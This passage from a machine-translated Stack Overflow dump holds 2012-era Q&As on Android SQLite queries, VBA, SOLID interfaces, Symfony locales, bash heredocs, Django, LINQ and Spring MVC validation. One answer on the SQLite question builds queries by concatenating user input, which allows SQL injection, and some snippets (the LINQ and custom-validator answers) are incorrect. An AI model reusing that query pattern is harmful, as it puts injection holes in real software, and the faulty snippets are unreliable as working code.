我不明白。表中有名称“Max”。我究竟做错了什么？提前致谢。

编辑2：有了这个：

```
Cursor cursor = db.rawQuery("SELECT name FROM persons WHERE name = '" + MainActivity.selectedPerson.getText().toString() + "'", null); 
```

我得到一个不同的错误：

```
08-27 19:43:47.573: E/AndroidRuntime(6161): android.database.CursorIndexOutOfBoundsException: Index -1 requested, with a size of 1 
```

这是什么意思？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:10:26.240

您应该考虑使用`selectionArgs`参数`rawQuery()`来防止[SQL 注入攻击](http://msdn.microsoft.com/en-us/library/ms161953%28v=sql.105%29.aspx)：

```
Cursor cursor = db.rawQuery("SELECT * FROM persons WHERE name = ?", new String[] { MainActivity.selectedPerson.getText().toString() }); 
```

此外，您只需要*一*列，而不是通过选择它们来浪费资源`*`，您应该只选择一列：

```
Cursor cursor = db.rawQuery("SELECT age FROM persons WHERE name = ?", new String[] { MainActivity.selectedPerson.getText().toString() }); 
```

希望有帮助！

* * *

总而言之，它应该看起来像：

```
public int getAge(){
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.rawQuery("SELECT age FROM persons WHERE name = ?", new String[] { MainActivity.selectedPerson.getText().toString() });

    int age;
    // Check if you have a valid result and move to the first row to read it
    if(cursor.moveToFirst())
        age = cursor.getInt(0);
    // Prevent a crash if there is no data for this name
    else
        age = 0;

    cursor.close();
    db.close();
    return age;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:21:00.413

更改程序的第 3 行：

```
Cursor cursor = db.rawQuery("SELECT * FROM persons WHERE name =? " + MainActivity.selectedPerson.getText().toString(), null); 
```

对此：

```
Cursor cursor = db.rawQuery("SELECT * FROM persons WHERE name = ?",  new String[] { MainActivity.selectedPerson.getText().toString()} ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:08:08.443

试试这个：

```
public int getAge(){
    int age;
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.rawQuery("SELECT * FROM persons WHERE name = '" + MainActivity.selectedPerson.getText().toString()+"'",null);
    if(cursor.moveToFirst())
    {
    age = cursor.getInt(3);              // column with ages
    }
    cursor.close();
    db.close();
    return age;
} 
```

您错过了 sql 命令中的单引号 (' ')。这就是为什么 MAX 被视为列而不是值的原因。

# xcode - 尝试通过 applescript 调用 bean 应用程序，在创建新文档时出现错误

> ID：12146268
> 
> 赞同：0
> 
> 时间：2012-08-27T17:02:49.163
> 
> 标签：xcode, macos, applescript

正在调用应用程序 Bean，但无法创建新文档 以下是错误“Bean 出现错误：无法制作类文档”。从文档到类的数字 -2710

我是这方面的新手，请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T20:08:35.613

Bean 是否支持 AppleScript？你可以在这里查看：AppleScript Editor --> File --> Open Dictionary

# excel - 从 VBA 中的工作表名称获取工作表索引

> ID：12146271
> 
> 赞同：2
> 
> 时间：2012-08-27T17:02:53.827
> 
> 标签：excel, vba

我需要在工作簿中拉出工作表的位置，只知道它的名称 - 例如：

如果我们有一张纸，说
`Workbook.Sheets("Sheet2")`

我将如何找到相应的整数，以便我可以将其称为：说 i 是一个整数
`Workbook.Sheets(i)`

我需要能够执行此反向指示，以便我可以参考我正在参考的工作表旁边的工作表。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:10:39.897

```
Workbook.Sheets("sheet name").Index 
```

**编辑：** brettdj 的回答启发了我，所以我写了这个函数，实际上考虑到它可能会被清理掉第 4 个参数为 true：

```
Function adjacentsheet(Optional ws As Worksheet, Optional wsName As String, Optional nextSheet As Boolean = True, Optional search As Boolean = False) As Worksheet
'Expects worksheet or worksheet.name if blank, uses activesheet.
'Third parameter indicates if the next sheet or previous sheet is wanted, default is next = true
'Indicates adjacent sheet based on worksheet provided.
'If worksheet is not provided, uses worksheet.name.
'If no worksheet matches corresponding name, checks other workbooks if 4th parameter is true
'If no worksheet can be found, alerts the user.
'Returns found worksheet based upon criteria.

If (ws Is Nothing) Then
    If wsName = "" Then
        Set adjacentsheet = adjacentsheet(ActiveSheet, , nextSheet)
    Else
        'Check all workbooks for the wsName, starting with activeWorkbook
        On Error Resume Next
        Set ws = Sheets(wsName)
        On Error GoTo 0
        If (ws Is Nothing) Then
            If search = True Then
                If Workbooks.Count = 1 Then
                    GoTo notFound
                Else
                    Dim wb As Workbook
                    For Each wb In Application.Workbooks
                        On Error Resume Next
                        Set ws = wb.Sheets(wsName)
                        On Error GoTo 0
                        If Not (ws Is Nothing) Then
                            Set adjacentsheet = adjacentsheet(ws, , nextSheet)
                            Exit For
                        End If
                    Next
                    If (ws Is Nothing) Then GoTo notFound
                End If
            Else
                GoTo notFound
            End If
        Else
            Set adjacentsheet = adjacentsheet(ws, , nextSheet, search)
        End If
    End If
Else
    With ws.Parent
        If nextSheet Then
            If ws.Index = .Sheets.Count Then
                Set adjacentsheet = .Sheets(1)
            Else
                Set adjacentsheet = .Sheets(ws.Index + 1)
            End If
        Else
            If ws.Index = 1 Then
                Set adjacentsheet = .Sheets(.Sheets.Count)
            Else
                Set adjacentsheet = .Sheets(ws.Index - 1)
            End If
        End If
    End With
End If
Exit Function
notFound:
MsgBox "Worksheet name could not be found!", vbCritical, "Invalid worksheet name."

End Function 
```

以下是一些用法示例：'用法示例

```
Dim nextws As Worksheet
'returns sheet before the active sheet
Set nextws = adjacentsheet(, , False)
'returns sheet after the active sehet
Set nextws = adjacentsheet()
'returns sheet after sheet named "Test" in current workbook
Set nextws = adjacentsheet(, "Test")
'returns sheet after sheet named "Test" in any open workbook checking current workbook first
Set nextws = adjacentsheet(, "Test", , True) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T01:35:35.793

如果您想引用`Next`or`Previous`表，那么您可以在不增加起始表位置的情况下执行此操作

```
Sub Test()
If Sheets.Count > ActiveSheet.Index Then
Debug.Print "next method: " & ActiveSheet.Next.Name
Debug.Print "index method: " & Sheets(ActiveSheet.Index + 1).Name
Else
Debug.Print "Active Sheet is the last sheet"
End If
End Sub 
```

# unit-testing - SOLID/TDD 鼓励一个接口一个实现

> ID：12146281
> 
> 赞同：1
> 
> 时间：2012-08-27T17:03:31.450
> 
> 标签：unit-testing, design-patterns, dependency-injection, tdd, solid-principles

我无意中听到以下内容，并被要求确认此声明：

“SOLID/TDD 鼓励对一个接口进行一种实现，这不是现实世界，而且违背了接口的观点，不是吗？”

我最初同意 TDD 和 DI 的所有在线示例都遵循典型的 IRepository/MyRepository 示例，其中只有一个实现。再三考虑后，我不同意。

我正在尝试做的是提供证明它不存在的证据，以及一个接口可以有多个实现的示例，并展示它在 DI 方面的工作原理。

我希望人们可以帮助我解决这个问题。

**更新：**虽然我了解 DI 和单元测试的概念，但我想展示的是我们如何在生产中让多个类实现一个接口。

**UPDATE2：**想到了一个简单的例子，这里是多个实现的可能实现，但它仍然不能真正回答我想要的。如果你有一个对 ILogger 或 IDataProvider 或 ISomething 有单一依赖的构造函数怎么办：

```
public interface ILogger
{
  void Write(string data);
}

public class FileLogger : ILogger
{
  void Write(string data)
  {
    //
  }
}

public class DBLogger : ILogger
{
  void Write(string data)
  {
    //
  }
}

public class EventViewerLogger : ILogger
{
  void Write(string data)
  {
    //
  }
}

public class Calculator
{
    private IEnumberable<ILogger> loggers;

    public Calculator(IEnumberable<ILogger> loggers)
    {
        this.loggers = loggers;
    }

    public int Add(int a, int b)
    {
      var result = a + b;

      foreach(var logger in loggers)
      {
        logger.Write("Result was " + logger);
      }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:06:09.017

不，您可以拥有任意数量的实现。TDD 测试实现，而不是接口。DI 注入实现，而不是接口。您使用接口，以便您可以有多个实现。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:06:37.023

测试时，您通常为接口创建一个模拟来隔离被测单元。

尽管您没有自己编写模拟，**但模拟对我来说仍然算作接口的实现**。

* * *

我不知道你想在这里得到什么。如果您有多个相同接口的实现，这取决于您的问题。最后——没关系。接口的优点并不是因为您可以在生产中同时拥有多个实现。我们在项目中有很多接口，可能大多数只有一个实现。它仍然值得拥有，因为：

*   **调用代码并不关心**你有多少实现 -> 它增强了**解耦**
*   您今天只有一个实现，将来可能会有另一个。（我知道，考虑到 YAGNI，这是一个弱论点）。
*   **测试**有它的模拟实现
*   **更改**实现就像创建**另一个**实现一样。您有多个实现，但不是同时实现。=> 它增强了**可维护性**。

简而言之：您不需要在生产中进行很多实现来原谅使用接口。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-27T18:21:51.227

SOLID 不促进接口和类之间的 1-1 映射。

接口隔离最接近我们得到的接口。但它指出您应该创建尽可能具体的接口。A`IUserRepository`可以分解为`IUserStorage`（CRUD）和`IUserQueries`（搜索）。`UserRepository`可能会从一开始就实现两者，而您稍后将它们分解。这样做的好处是您可以轻松创建缓存实现（装饰器模式）或使用不同的数据源进行写入和读取（CQRS）。

如果你正确地遵循 SOLID，你最终会得到定义良好的小型类，这些类具有易于使用并为其创建不同实现的接口。

问题是大家在讨论 SOLID 的时候只是想到了典型的业务逻辑。但是我们都在不同的框架中运行代码，如果应用 SOLID，这将受益匪浅。

我不太擅长TDD，所以我不会对此发表评论。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T20:51:36.687

我同意 Stefan 的观点。测试可能不在生产环境中，但它们是应用程序的第一个消费者。

关于 TDD/SOLID 产生无意义接口的论点，我要提出一个警告：SOLID 鼓励抽象，不一定是接口。如果您正在为所有内容创建接口，那么这对某些开发人员来说可能显得非常笨拙。接口应该是系统消费者的扩展点。在某些情况下，如果测试是您的主要目标，那么具有虚拟方法的抽象类或非密封类可能更合适。一些开发人员将内部类上的虚拟方法视为永远不会在其应用程序范围之外使用的东西。这种说法可能有道理，但总有可能将其扩展到外部消费者——将其分解成小块可能会使扩展和重构更容易。那里' 还有一些关于不必手动测试应用程序几个小时的事情。这是你的同事应该愿意做出的妥协。

在我开发的应用程序中，核心服务需要每个实例有更多的实现，但我开发的应用程序需要不同的实现来满足*特定于硬件的实现*，例如*网络摄像头*、*Kinect*。我可能一次只需要一个，但混合/匹配组件的能力非常强大。

关于一次多个实现，*策略*和*插件*模式很流行。可以像完全通过插件组成其界面的模块化应用程序一样广泛，或者是配置驱动的税收计算。

根据您的示例，日志记录通常是混合实现的一个很好的示例。我经常使用 log4net 将所有内容记录到文件中，将错误记录到事件日志中，并将崩溃记录到电子邮件附加程序。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-10T17:09:45.867

Bob 大叔，坚实原则的命名者（不是发明者）有一个著名的会计系统示例，您可以在《原则、模式和实践》一书中找到它。在此示例中，他有一个可以根据员工列表生成报告的类。雇员可以是按小时付费的雇员，或者例如是按月付费的雇员。尽管如此，他们都是雇员，因此实现了相同的接口。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-27T17:54:03.323

因此，您正在寻找具有多种实现并用于生产环境的接口示例？

JDBC - Oracle、MySql、任何其他数据库都有自己的 JDBC 接口实现

JPA - 请参阅[JPA 实现 - 最好使用哪一个？](https://stackoverflow.com/questions/576659/jpa-implementations-which-one-is-the-best-to-use)接口的实现列表

还是您在寻找其他东西？

# php - 使用 symfony 2.1 更改语言环境

> ID：12146282
> 
> 赞同：6
> 
> 时间：2012-08-27T17:03:32.467
> 
> 标签：php, symfony, symfony-2.1

在 symfony 2.1 网站上更改语言环境时遇到一些问题。

`_locale`如果不在每条路线上使用 ，我就找不到能够更改语言的方法。我知道这违反[了基本规则](http://symfony.com/doc/master/book/translation.html#the-locale-and-the-url)，但是这个内容例如不会被引擎索引，因为它只是成员。

通常，我想要一种简单的方法来更改请求（从 2.1 版开始的 BC）或会话中的语言环境，但不知道如何顺利​​地做到这一点。我也想避免为此使用监听器。

**config.yml 文件：**

```
framework:
    translator:      { fallback: %locale% }
    session: 
```

**路由.yml 文件：**

```
route_change_lang:
    pattern:   /changelang/{newlang}
    defaults:  { _controller: AcmeCoreBundle:Default:switchLanguage, newlang: en }
    requirements:
        newlang: en|fr|de 
```

**更新路由器区域设置的简单操作：**

```
public function switchLanguageAction($newlang)
{

    $request = $this->getRequest();

    $request->setLocale($newlang);

    $referer_url = $this->get('request')->headers->get('referer');
    if ($referer_url != null) {
        return $this->redirect($referer_url);
    } else {
        return $this->redirect($this->generateUrl('route_home'));
    }
} 
```

问题是什么？我猜它与主 config.yml 文件中设置的 default_locale 有关，但文档不是很清楚，感谢任何帮助/提示

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-16T14:38:40.917

我遇到了同样的问题，因为我们不能在我们的网址中使用语言环境（seo 问题）。我们还使用像 en_US 这样的语言环境，这些语言环境存储在直接框架访问之外的配置中。我所做的是注册一个事件侦听器并连接到 onKernelRequest 事件。在那里我检查是否在会话中设置了语言环境，如果没有，我将它添加到请求和会话中。这样，框架的行为将保持与 2.1 之前一样

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-29T13:35:34.207

[按照https://github.com/symfony/symfony/blob/master/UPGRADE-2.1.md#httpfoundation-1](https://github.com/symfony/symfony/blob/master/UPGRADE-2.1.md#httpfoundation-1)中的说明恢复旧行为 并使用 Carlos Granados 的代码。

您还可以阅读我的另一个答案[https://stackoverflow.com/a/12952999/520114](https://stackoverflow.com/a/12952999/520114)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-27T17:59:11.927

如果您在请求中设置语言环境，则仅用于当前请求。下次发出请求时，将使用 default_locale。即使现在（2.1）在请求而不是会话中设置了语言环境，“也可以将语言环境存储在会话中而不是基于每个请求。如果这样做，每个后续请求都将具有此语言环境。” （来自文档）。所以，你需要这样做：

```
$this->get('session')->set('_locale', $newlang); 
```

# bash - BASH Case 语句，语法错误（文件非预期结尾）

> ID：12146284
> 
> 赞同：1
> 
> 时间：2012-08-27T17:03:55.620
> 
> 标签：bash, syntax, case

我不断收到语法错误（文件意外结束）。语法对我来说看起来不错，但这里显然有问题。我希望外面的人可以提供洞察力。

```
read -p "Create default hosts file?: " yn

       case $yn in
        [Yy] )  echo "Creating default hosts file"
            sleep 1
            cat <<-EOF1 > /etc/hosts
               Do not remove the following line, or various programs that  require network functionality will fail.
               127.0.0.1    localhost.localdomain localhost

               192.168.1.1      test01
               192.168.1.2      test02
               192.168.1.3      test03
               EOF1
                if [ "$(wc -m /etc/hosts)" == "215 /etc/hosts" ] ; then
               echo -e "Default Hosts file\e[1;32m COMPLETE \e[0m"     
            else
               echo -e "Default hosts file\e[1;31m FAILED \e[0m"
               sleep 1
               echo "Please correct before continuing"
               echo "EXITING..."
               sleep 1
               exit
            fi;;
        [Nn] )  echo 'Searching "/etc/hosts" for test03 entry'
            sleep 1
            grep "test03" /etc/hosts >/dev/null
            if [ "$?" -eq 0 ] ; then
               echo "Entry found!"
               echo "Setup Continuing..."
            else
               echo '"test03" entry not found'
               sleep 1
               echo "Please correct before continuing"
               sleep 1
               echo "EXITING..."
               sleep 1
               exit
            fi;;
         *   )  echo "Please answer [Yy] or [Nn].";;
       esac 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:06:21.373

此处文档标记的结尾应该是除制表符之外的行上的第一件事：

```
cat <<-EOF1 > /etc/hosts
           Do not remove the following line, or various programs that  require network functionality will fail.
           127.0.0.1    localhost.localdomain localhost

           192.168.1.1      test01
           192.168.1.2      test02
           192.168.1.3      test03
EOF1 
```

# apache2 - 在 Apache 上运行的 Django 应用程序提供空白 200 响应

> ID：12146291
> 
> 赞同：1
> 
> 时间：2012-01-09T17:13:30.373
> 
> 标签：apache2, ubuntu, django

我正在尝试在具有 mod_wsgi 和 Apache 的 Ubuntu 10 服务器上部署基于 Django 构建的应用程序。当我尝试访问某些视图时，我收到 200 响应，但没有来自服务器的内容。这些是有效和无效的观点：

```
def this_works(request):
    return render_to_response('admin/index.html')

def this_also_works(request):
    return HttpResponse(loader.render_to_string('admin/index.html'))

def this_doesnt_work(request):
    return SimpleTemplateResponse(Template('Example text')) 
```

除此之外，管理站点和登录视图也不起作用。该应用程序与 Django 的运行服务器完美配合。

我非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T20:12:04.570

看[文档](https://docs.djangoproject.com/en/dev/ref/template-response/#using-templateresponse-and-simpletemplateresponse)

看来您使用 SimpleTemplateResponse 错误。

```
return SimpleTemplateResponse(request, 'admin/index.html') 
```

将是我看到的方式使用它的方式。如果要渲染字符串，您可以将其渲染为您的视图，然后使用 HttpResponse 将其返回。

# c# - 枚举期间的 LINQ 强制转换

> ID：12146296
> 
> 赞同：1
> 
> 时间：2012-08-27T17:04:51.230
> 
> 标签：c#, linq, list, dictionary, casting

我有一个`List<string>`

```
List<string> students;
students.Add("Rob");
students.Add("Schulz"); 
```

和一个`Dictionary<string,string>`

```
Dictionary<string, string> classes= new Dictionary<string, string>();
classes.Add("Rob", "Chemistry");  
classes.Add("Bob", "Math"); 
classes.Add("Holly", "Physics"); 
classes.Add("Schulz", "Botany"); 
```

我现在的目标是获得一个包含我正在使用 的值`Chemistry`的列表`Botany`

```
var filteredList = students.Where(k => classes.ContainsKey(k))
                                         .Select(k => new { tag = students[k] }); 
```

在尝试枚举值时 - 我能够获得 - `tag=Chemistry`& `tag=Botany`...而我想要的只是`Chemistry`and `Botany`。

什么是合适的铸件？有没有更好的方法来获得这些值？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T17:06:50.723

你只需要写：

```
var filteredList = students.Where(student => classes.ContainsKey(student)); 
```

这里，`student`是 a `string`，因为`students`是 a `List<string>`，所以你只需要应用[Where()](http://msdn.microsoft.com/en-us/library/bb534803.aspx)。结果将是一个`IEnumerable<string>`.

如果您想将可枚举项耗尽到另一个中，则可以应用[ToList()](http://msdn.microsoft.com/en-us/library/bb342261.aspx)`List<string>`：

```
var filteredList = students.Where(student => classes.ContainsKey(student)).ToList(); 
```

如果您想要一个课程列表（从问题中的代码中不清楚），那么您必须将[Select()](http://msdn.microsoft.com/en-us/library/bb548891)应用于学生的项目课程：

```
var filteredList = students.Where(student => classes.ContainsKey(student))
                           .Select(student => classes[student]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:07:08.223

尝试：

```
var filteredList = students.Where(k => classes.ContainsKey(k))
                                     .Select(k => students[k]); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:07:45.667

```
var filteredList = students.Where(k => classes.ContainsKey(k))
                                         .Select(k => students[k]); 
```

# java - Spring MVC：如何执行验证？

> ID：12146298
> 
> 赞同：162
> 
> 时间：2012-08-27T17:04:53.093
> 
> 标签：java, spring-mvc, validation, user-input

我想知道对用户输入进行表单验证的最干净和最好的方法是什么。我见过一些开发人员实现[`org.springframework.validation.Validator`](http://docs.spring.io/spring-framework/docs/4.2.x/javadoc-api/org/springframework/validation/Validator.html). 一个关于那个的问题：我看到它验证了一个类。类是否必须用用户输入的值手动填充，然后传递给验证器？

我对验证用户输入的最干净和最好的方法感到困惑。我知道使用`request.getParameter()`然后手动检查的传统方法`nulls`，但我不想在我的`Controller`. 将不胜感激有关该领域的一些好的建议。我没有在这个应用程序中使用 Hibernate。

* * *

## 回答 #1

> 赞同：333
> 
> 时间：2012-08-27T20:42:26.397

使用 Spring MVC，有 3 种不同的方式来执行验证：使用注解、手动或两者混合。没有一种独特的“最干净和最好的方法”来验证，但可能有一种更适合您的项目/问题/上下文。

让我们有一个用户：

```
public class User {

    private String name;

    ...

} 
```

**方法 1：**如果您有 Spring 3.x+ 和简单的验证，请使用`javax.validation.constraints`注解（也称为 JSR-303 注解）。

```
public class User {

    @NotNull
    private String name;

    ...

} 
```

您的库中将需要一个 JSR-303 提供程序，例如作为参考实现的[Hibernate Validator](http://www.hibernate.org/subprojects/validator.html)（该库与数据库和关系映射无关，它只是进行验证:-)。

然后在你的控制器中你会有类似的东西：

```
@RequestMapping(value="/user", method=RequestMethod.POST)
public createUser(Model model, @Valid @ModelAttribute("user") User user, BindingResult result){
    if (result.hasErrors()){
      // do something
    }
    else {
      // do something else
    }
} 
```

注意 @Valid ：如果用户碰巧有一个空名称，result.hasErrors() 将为真。

**方法2：**如果你有复杂的验证（比如大业务验证逻辑，跨多个字段的条件验证等），或者由于某种原因你不能使用方法1，使用手动验证。将控制器的代码与验证逻辑分开是一种很好的做法。不要从头开始创建验证类，Spring 提供了一个方便的`org.springframework.validation.Validator`接口（从 Spring 2 开始）。

所以假设你有

```
public class User {

    private String name;

    private Integer birthYear;
    private User responsibleUser;
    ...

} 
```

并且您想做一些“复杂”的验证，例如：如果用户的年龄低于 18 岁，则责任用户不能为空，责任用户的年龄必须超过 21 岁。

你会做这样的事情

```
public class UserValidator implements Validator {

    @Override
    public boolean supports(Class clazz) {
      return User.class.equals(clazz);
    }

    @Override
    public void validate(Object target, Errors errors) {
      User user = (User) target;

      if(user.getName() == null) {
          errors.rejectValue("name", "your_error_code");
      }

      // do "complex" validation here

    }

} 
```

然后在您的控制器中，您将拥有：

```
@RequestMapping(value="/user", method=RequestMethod.POST)
    public createUser(Model model, @ModelAttribute("user") User user, BindingResult result){
        UserValidator userValidator = new UserValidator();
        userValidator.validate(user, result);

        if (result.hasErrors()){
          // do something
        }
        else {
          // do something else
        }
} 
```

如果存在验证错误，result.hasErrors() 将为真。

注意：您还可以使用“binder.setValidator(...)”在控制器的 @InitBinder 方法中设置验证器（在这种情况下，方法 1 和 2 的混合使用是不可能的，因为您替换了默认值验证器）。或者您可以在控制器的默认构造函数中实例化它。或者在控制器中注入一个@Component/@Service UserValidator（@Autowired）：非常有用，因为大多数验证器都是单例 + 单元测试模拟变得更容易 + 你的验证器可以调用其他 Spring 组件。

**方法3：** 为什么不结合使用这两种方法？使用注释验证简单的东西，例如“名称”属性（它做起来很快，简洁且更具可读性）。为验证器保留繁重的验证（当编写自定义复杂验证注释需要数小时，或者只是在无法使用注释时）。我在以前的项目中这样做过，它就像一个魅力，又快又容易。

**警告：**您不能将**验证处理**误认为是**异常处理**。[阅读这篇文章](https://stackoverflow.com/a/12661291/400545)以了解何时使用它们。

参考 ：

*   [一篇关于 bean 验证的非常有趣的博文](http://web.archive.org/web/20120508030459/http://blog.orange11.nl/2009/08/04/bean-validation-integrating-jsr-303-with-spring)（[原始链接](http://blog.orange11.nl/2009/08/04/bean-validation-integrating-jsr-303-with-spring/)已失效）
*   [另一个关于验证的好博客文章](http://web.archive.org/web/20140825121040/http://alasdoo.com/2011/07/data-validation-conversion-basics-custom-error-messages-in-spring-mvc/)（原始链接已失效）
*   [有关验证的最新 Spring 文档](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/validation.html)

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-08-27T19:28:20.790

有两种方法可以验证用户输入：注解和继承 Spring 的 Validator 类。对于简单的情况，注释很好。如果您需要复杂的验证（如跨字段验证，例如“验证电子邮件地址”字段），或者如果您的模型在应用程序中的多个位置使用不同的规则进行验证，或者您无法修改您的通过在模型对象上放置注释，Spring 的基于继承的 Validator 是要走的路。我将展示两者的例子。

无论您使用哪种类型的验证，实际验证部分都是相同的：

```
RequestMapping(value="fooPage", method = RequestMethod.POST)
public String processSubmit(@Valid @ModelAttribute("foo") Foo foo, BindingResult result, ModelMap m) {
    if(result.hasErrors()) {
        return "fooPage";
    }
    ...
    return "successPage";
} 
```

如果您使用注释，您的`Foo`类可能如下所示：

```
public class Foo {

    @NotNull
    @Size(min = 1, max = 20)
    private String name;

    @NotNull
    @Min(1)
    @Max(110)
    private Integer age;

    // getters, setters
} 
```

上面的注释是`javax.validation.constraints`注释。你也可以使用 Hibernate 的 `org.hibernate.validator.constraints`，但看起来你不是在使用 Hibernate。

或者，如果您实现 Spring 的 Validator，您将创建一个类，如下所示：

```
public class FooValidator implements Validator {

    @Override
    public boolean supports(Class<?> clazz) {
        return Foo.class.equals(clazz);
    }

    @Override
    public void validate(Object target, Errors errors) {

        Foo foo = (Foo) target;

        if(foo.getName() == null) {
            errors.rejectValue("name", "name[emptyMessage]");
        }
        else if(foo.getName().length() < 1 || foo.getName().length() > 20){
            errors.rejectValue("name", "name[invalidLength]");
        }

        if(foo.getAge() == null) {
            errors.rejectValue("age", "age[emptyMessage]");
        }
        else if(foo.getAge() < 1 || foo.getAge() > 110){
            errors.rejectValue("age", "age[invalidAge]");
        }
    }
} 
```

如果使用上述验证器，您还必须将验证器绑定到 Spring 控制器（如果使用注释则不需要）：

```
@InitBinder("foo")
protected void initBinder(WebDataBinder binder) {
    binder.setValidator(new FooValidator());
} 
```

另请参阅[Spring 文档](http://static.springsource.org/spring/docs/current/spring-framework-reference/htmlsingle/spring-framework-reference.html#validation-mvc-triggering)。

希望有帮助。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-05-10T11:02:44.463

我想扩展 Jerome Dalbert 的好回答。我发现以 JSR-303 方式编写自己的注释验证器非常容易。您不限于拥有“一个字段”验证。您可以在类型级别创建自己的注释并进行复杂的验证（参见下面的示例）。我更喜欢这种方式，因为我不需要像 Jerome 那样混合不同类型的验证（Spring 和 JSR-303）。此外，此验证器具有“Spring 意识”，因此您可以开箱即用地使用 @Inject/@Autowire。

**自定义对象验证示例：**

```
@Target({ TYPE, ANNOTATION_TYPE })
@Retention(RUNTIME)
@Constraint(validatedBy = { YourCustomObjectValidator.class })
public @interface YourCustomObjectValid {

    String message() default "{YourCustomObjectValid.message}";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};
}

public class YourCustomObjectValidator implements ConstraintValidator<YourCustomObjectValid, YourCustomObject> {

    @Override
    public void initialize(YourCustomObjectValid constraintAnnotation) { }

    @Override
    public boolean isValid(YourCustomObject value, ConstraintValidatorContext context) {

        // Validate your complex logic 

        // Mark field with error
        ConstraintViolationBuilder cvb = context.buildConstraintViolationWithTemplate(context.getDefaultConstraintMessageTemplate());
        cvb.addNode(someField).addConstraintViolation();

        return true;
    }
}

@YourCustomObjectValid
public YourCustomObject {
} 
```

**通用字段相等的示例：**

```
import static java.lang.annotation.ElementType.ANNOTATION_TYPE;
import static java.lang.annotation.ElementType.TYPE;
import static java.lang.annotation.RetentionPolicy.RUNTIME;

import java.lang.annotation.Documented;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;

import javax.validation.Constraint;
import javax.validation.Payload;

@Target({ TYPE, ANNOTATION_TYPE })
@Retention(RUNTIME)
@Constraint(validatedBy = { FieldsEqualityValidator.class })
public @interface FieldsEquality {

    String message() default "{FieldsEquality.message}";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    /**
     * Name of the first field that will be compared.
     * 
     * @return name
     */
    String firstFieldName();

    /**
     * Name of the second field that will be compared.
     * 
     * @return name
     */
    String secondFieldName();

    @Target({ TYPE, ANNOTATION_TYPE })
    @Retention(RUNTIME)
    public @interface List {
        FieldsEquality[] value();
    }
}

import java.lang.reflect.Field;

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.util.ReflectionUtils;

public class FieldsEqualityValidator implements ConstraintValidator<FieldsEquality, Object> {

    private static final Logger log = LoggerFactory.getLogger(FieldsEqualityValidator.class);

    private String firstFieldName;
    private String secondFieldName;

    @Override
    public void initialize(FieldsEquality constraintAnnotation) {
        firstFieldName = constraintAnnotation.firstFieldName();
        secondFieldName = constraintAnnotation.secondFieldName();
    }

    @Override
    public boolean isValid(Object value, ConstraintValidatorContext context) {
        if (value == null)
            return true;

        try {
            Class<?> clazz = value.getClass();

            Field firstField = ReflectionUtils.findField(clazz, firstFieldName);
            firstField.setAccessible(true);
            Object first = firstField.get(value);

            Field secondField = ReflectionUtils.findField(clazz, secondFieldName);
            secondField.setAccessible(true);
            Object second = secondField.get(value);

            if (first != null && second != null && !first.equals(second)) {
                    ConstraintViolationBuilder cvb = context.buildConstraintViolationWithTemplate(context.getDefaultConstraintMessageTemplate());
          cvb.addNode(firstFieldName).addConstraintViolation();

          ConstraintViolationBuilder cvb = context.buildConstraintViolationWithTemplate(context.getDefaultConstraintMessageTemplate());
          cvb.addNode(someField).addConstraintViolation(secondFieldName);

                return false;
            }
        } catch (Exception e) {
            log.error("Cannot validate fileds equality in '" + value + "'!", e);
            return false;
        }

        return true;
    }
}

@FieldsEquality(firstFieldName = "password", secondFieldName = "confirmPassword")
public class NewUserForm {

    private String password;

    private String confirmPassword;

} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-04-21T14:42:28.520

如果您对不同的方法处理程序具有相同的错误处理逻辑，那么您最终会得到许多具有以下代码模式的处理程序：

```
if (validation.hasErrors()) {
  // do error handling
}
else {
  // do the actual business logic
} 
```

假设您正在创建 RESTful 服务并希望`400 Bad Request`为每个验证错误案例返回错误消息。然后，对于每个需要验证的 REST 端点，错误处理部分都是相同的。在每个处理程序中重复相同的逻辑并不是那么**干燥**！

`BindingResult`解决此问题的一种方法是在每个*待验证*bean之后立即删除。现在，您的处理程序将是这样的：

```
@RequestMapping(...)
public Something doStuff(@Valid Somebean bean) { 
    // do the actual business logic
    // Just the else part!
} 
```

这样，如果绑定的 bean 无效，`MethodArgumentNotValidException`Spring 将抛出 a。您可以`ControllerAdvice`使用相同的错误处理逻辑定义处理此异常的 a：

```
@ControllerAdvice
public class ErrorHandlingControllerAdvice {
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public SomeErrorBean handleValidationError(MethodArgumentNotValidException ex) {
        // do error handling
        // Just the if part!
    }
} 
```

`BindingResult`您仍然可以使用`getBindingResult`的方法检查底层`MethodArgumentNotValidException`。

* * *

